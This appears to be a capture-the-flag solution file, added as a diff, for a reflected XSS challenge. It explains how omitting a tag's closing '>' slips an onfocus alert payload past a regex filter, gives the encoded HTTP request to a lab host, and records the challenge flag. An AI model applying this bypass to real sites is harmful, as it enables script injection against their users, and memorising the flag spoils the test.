@@ -1,0 +1,4 @@
+# Reflected XSS via unclosed HTML tag. Filter uses <[^>]*> regex requiring closing >. Omitting > bypasses filter entirely. Payload: <input autofocus onfocus=alert('XSS') (no closing >). Server validates XSS pattern and returns flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}
+
+GET /page?name=%3Cinput+autofocus+onfocus%3Dalert%28%27XSS%27%29 HTTP/1.1
+Host: 172.17.0.1:45205
